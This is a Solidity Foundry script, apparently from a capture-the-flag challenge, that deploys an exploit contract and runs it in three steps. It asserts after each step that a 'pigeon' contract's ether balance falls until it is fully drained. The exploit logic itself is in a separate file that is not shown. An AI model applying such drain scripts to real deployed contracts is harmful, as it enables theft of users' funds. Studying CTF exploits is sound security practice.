// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.17;


import './Exploit.sol';
import 'forge-std/Script.sol';
import './Setup.sol';

contract PigeonExploitScript is Script {
    // Test if working when simualating
    function RunExploit(address _chall) public {
        vm.startBroadcast();
        PigeonExploit exp = new PigeonExploit(msg.sender);
        console.log(uint160(address(exp)));
        Setup chall = Setup(payable(_chall));
        address pigeonAddress = address(chall.pigeon());
        uint256 pigeonbalance = pigeonAddress.balance;
        exp.setTarget(_chall);
        // Step1
        exp.Step1();
        require(pigeonAddress.balance == pigeonbalance - 5e18, "Exploit Failed");
        pigeonbalance -= 5e18;

        // Step2
        exp.Step2();
        require(pigeonAddress.balance == pigeonbalance - 10e18, "Exploit Failed");
        pigeonbalance -= 10e18;

        // Step3
        exp.Step3();
        require(pigeonAddress.balance == 0, "Exploit Failed");
        console.log("Exploit Succeed!");
        vm.stopBroadcast();
    }
}
